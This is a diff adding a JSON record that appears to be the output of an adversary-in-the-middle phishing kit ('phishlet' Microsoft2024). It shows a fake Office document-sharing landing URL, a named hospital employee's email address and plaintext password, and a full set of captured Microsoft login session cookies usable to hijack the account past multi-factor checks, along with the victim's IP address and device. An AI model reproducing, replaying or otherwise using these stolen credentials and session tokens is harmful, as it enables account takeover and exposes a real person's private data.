@@ -1,0 +1,121 @@
+{
+  "id": 41,
+  "phishlet": "Microsoft2024",
+  "landing_url": "https://office.orderinv-sharedocs.info/uCeGVUja",
+  "username": "mfarooqui@zulekhahospitals.com",
+  "password": "Asfar@4629",
+  "custom": {
+    "Username": "mfarooqui@zulekhahospitals.com"
+  },
+  "body_tokens": {},
+  "http_tokens": {},
+  "tokens": {
+    ".login.live.com": {
+      "MSPRequ": {
+        "HttpOnly": true,
+        "Name": "MSPRequ",
+        "Path": "/",
+        "Value": "id=N\u0026lt=1738691393\u0026co=0"
+      },
+      "uaid": {
+        "HttpOnly": true,
+        "Name": "uaid",
+        "Path": "/",
+        "Value": "e78a500719f143ca9dd5da978b48fc5f"
+      }
+    },
+    ".login.microsoftonline.com": {
+      "CCState": {
+        "HttpOnly": true,
+        "Name": "CCState",
+        "Path": "",
+        "Value": "Q3BFQkNoNXRabUZ5YjI5eGRXbEFlblZzWld0b1lXaHZjM0JwZEdGc2N5NWpiMjBTQVFFaUNRbUFjSzJGZGpUZFNDb0pDVFV5QlF3Z1RkMUlNaW9LRWdvUVcwUmxSOFl5c0VtRDVoMlRkbEoyeWhJSkNSY1JSRENmUjkxSUdna0pOYkxqWTBSRjNVZzRBRWdBVWhJS0VDNmhsMFRNbUoxQ2lBLzdZRTNaOHZCYUVnb1FkRm1RTExrRHowYVFFV2ZEaHQ4eE9SSVNDaENzcjk0eWYvSFpTS1lua1pENmdyVUdHZ2tKTmJMalkwUkYzVWd5ZmdJQUFSOEJBQUFBVmEwcVhybG1wa1dwdG93QmRWMFVCQU1BN1A4RkFQVC9yK3I0K2JpRFdvNE4zdWlYajFCd2daaUh1UjZMM0VCQmpMT2dYdmNpeFVlMC82eXFRYkVmOFlrYk54dE05MU1KWVl5OWNoUU81dnBXWmtoTUhWa2dMWkNwL3RDSlQrTFRyYnJMc3JrSlJ1NnBqWkJKNXY2WS93TDZSYkUwSHc9PQ=="
+      },
+      "ESTSAUTH": {
+        "HttpOnly": true,
+        "Name": "ESTSAUTH",
+        "Path": "/",
+        "Value": "1.ATkALqGXRMyYnUKID_tgTdny8FtEZUfGMrBJg-Ydk3ZSdsrgALc5AA.AgABFwQAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P9_Yo7MUIAjRONHeZYKklWKOU0_RpmynngmOv4tvzCKXv-dS3-Wmo6mgpJW0EbQZvGKWsllU30cBQ"
+      },
+      "ESTSAUTHPERSISTENT": {
+        "HttpOnly": true,
+        "Name": "ESTSAUTHPERSISTENT",
+        "Path": "/",
+        "Value": "1.ATkALqGXRMyYnUKID_tgTdny8FtEZUfGMrBJg-Ydk3ZSdsrgALc5AA.AgABFwQAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P9AoNbFIrQBH3Kdtl13va0-gGDETVPvlkGo86vOaZVKOXNBorWb585MkELf920pu203fayh9N2FdWEo8ry5cVaWFF418kKS9uQBFbAaOCnTlPVhFCpNjItC0husAA0cb2jp-nFBW_O3d7ptmRCML9lWySKlNx_dVDpeZvrH_m0Ka7u70XTO8-YeWOA6Hmnt6pUKwO63zAtHWbAnlvTDvCQOJUsgoTzuYlSpwHzOiUgzH9SRzeKckSJmkQIPhXPlvpnqgeUhDPgId3G5q16NuDnj7Uw76-QpLtdDgulYYmQgwuqh0xUPhjWcae3gL2Rzq0Bmi4VibYMaWX8rBl3PJNhw34Tr6Fod-z9Vnw-fUFVnoHy9Ki8NHZzKULQ1Il4hthA9ZLRroWerFBc-XjgHAt23wm8eLoOGGs-RFYwW33VTK_m3gPj7LXjJvBnpD0dmVqsWOsimcthJp_XJ79RAobZ_F9ZGU4FXkiDtPg6UBRjfAXDFtIJFPCF13PaQYo4l4f8ID2aA-m0aYQc4azV_j5oxCmjmmR6tr08oZEaMN1H9bIXXlqw7JwF5NeiP-njllPc2RcsvGyWFeQIht0Rx3AunqmVksvEA4FqWVJcx3WNkcq8rcUHsO5_kl1ssbRWDWod022kNaqhfo8u2KhzGjfhBqjPPsfHkri10TSojh8u5IguQuw"
+      },
+      "SignInStateCookie": {
+        "HttpOnly": true,
+        "Name": "SignInStateCookie",
+        "Path": "",
+        "Value": "CAgABFgIAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P_wJ3NCk7MJC_GHTFEVHDFwHXGsyxMsZgYLpIpyDlxsB2zsN5EyG02RydlIrcycfIGIcfi9ETrfm16lkVHZyuPyGzzHQnXtj0x1Nq9RRmC-WWXOK4kpFu1bQ25Gf0icBtPwyA7Zf66jBC8G-JPjNkO-8dand5AeauT2i8_iX5ZllzVuKIf7AQnSb6zWm8P5aENkw2dMorabAxoOUQivjmaZJ6s6yhvewz-586JmuLDMNePlCqpUBSFzFeF5Gql-jB2lmbfYluQ"
+      },
+      "esctx": {
+        "HttpOnly": true,
+        "Name": "esctx",
+        "Path": "/",
+        "Value": "PAQABBwEAAABVrSpeuWamRam2jAF1XRQE29WuH6mhsXfmB8DpcZ-fWG6A35pWT4G3JCIdyKTx5phpMddMQydz2fAplqI51LIpMYFYen-JXQz9rDd1PUhZoazLWuDH7gjIsUX6BzYGnM5wBZvBfHbvNJKvyyr4fV7nI2I7L7s5KSPdidnwbE1_t9ja6d55ggnAqamWxJi0vXkgAA"
+      },
+      "esctx-Bmc1vtAHU": {
+        "HttpOnly": true,
+        "Name": "esctx-Bmc1vtAHU",
+        "Path": "",
+        "Value": "AQABCQEAAABVrSpeuWamRam2jAF1XRQEV4VgkUaCkEUStIRniHp_TCCyOLo3YWu_pqE5VbWPzvhr7Rezj2eVEOtmplQqTN9u6p8J2QGx9o2cdSeow7ct3PYHKPFgBaE9mubZM_IAG2BRmonfQCfaXBFkFhFiCmNNM1jIk-13dCwdJu0V-J4v5SAA"
+      },
+      "esctx-IABVfAMt2w": {
+        "HttpOnly": true,
+        "Name": "esctx-IABVfAMt2w",
+        "Path": "",
+        "Value": "AQABCQEAAABVrSpeuWamRam2jAF1XRQE5PU_shgeMVApRG8I4cFEoT_xJKWXxfyIghMF4lX-GZjYH5Z3S229BiDjzu_lHXY0nMNfAf32oEZKQcj4uJPIp04lb8Hv_6KB-T4EEDo6Lkpt69uxC5JC79JOpvcj23RCL1A6ousLMPAEf-NnVF4HpSAA"
+      },
+      "esctx-MemE0oJ4ilA": {
+        "HttpOnly": true,
+        "Name": "esctx-MemE0oJ4ilA",
+        "Path": "",
+        "Value": "AQABCQEAAABVrSpeuWamRam2jAF1XRQEIVLXflOFMC5GOujyMU-F4YtxvX_7byEgs3rupmzCpeuEjF-rx9PtAB5HE-Dfy2M5x2YS9uKRKTDi7jxhrXNzbUPaB9gL5fS9EIiTkjchuo1LASiZgX9xmkoV4Rgngff7YMpI3RoVCyCU_ldAVNedYSAA"
+      },
+      "esctx-gfgNLWpLEcw": {
+        "HttpOnly": true,
+        "Name": "esctx-gfgNLWpLEcw",
+        "Path": "",
+        "Value": "AQABCQEAAABVrSpeuWamRam2jAF1XRQEweTAi_K5f5dVSj6csBWzMQnaxn2nBkd4nKz1YZmnsigylli3rrVvIv6n4nx9uKs8eKeH__T9ctlv29YN1ACDSIKbkrUMUkWFUXQOu06S5LIlCc1wZfc0YfFala5dGRRaf0NlkEKF8GQjZWVchWA_USAA"
+      }
+    },
+    "login.microsoftonline.com": {
+      "ESTSAUTHLIGHT": {
+        "HttpOnly": false,
+        "Name": "ESTSAUTHLIGHT",
+        "Path": "/",
+        "Value": "+001f28a9-89f9-ebc1-11ed-f9b7e7175e53"
+      },
+      "buid": {
+        "HttpOnly": true,
+        "Name": "buid",
+        "Path": "/",
+        "Value": "1.ATkALqGXRMyYnUKID_tgTdny8FtEZUfGMrBJg-Ydk3ZSdsrgALc5AA.AQABGgEAAABVrSpeuWamRam2jAF1XRQEKuDfiQjqZB4Gbo7sRXUFIOAWiEY4CDBFoHopgQAVpxguIBRMfRt5_WG7g4pa1lT0F43ReORfwl9WbS1pYqYHl4yzq1oaPxaMDWGVfTHscrDoWGJcmY2BgG69QPdBTW53_gsY7wV6Z1WTtH4uYaJlEPaC1IB7TV-_bGU3pfzOigYgAA"
+      },
+      "fpc": {
+        "HttpOnly": true,
+        "Name": "fpc",
+        "Path": "/",
+        "Value": "AstzuZIRNB1Ep0yHette5KkiYomAAQAAAFpKNN8OAAAAUJmBVQEAAADkSTTfDgAAAAHvyvQBAAAAVEo03w4AAAA"
+      },
+      "stsservicecookie": {
+        "HttpOnly": true,
+        "Name": "stsservicecookie",
+        "Path": "",
+        "Value": "estsfd"
+      },
+      "x-ms-gateway-slice": {
+        "HttpOnly": true,
+        "Name": "x-ms-gateway-slice",
+        "Path": "/",
+        "Value": "estsfd"
+      }
+    }
+  },
+  "session_id": "ae7ab21a3fed81020c4a73d489fc090c9dbb5cd3f551ab3118977d8c6f7de6ab",
+  "useragent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.7 Mobile/15E148 Safari/604.1",
+  "remote_addr": "105.112.112.170",
+  "create_time": 1738691274,
+  "update_time": 1738691419
+}
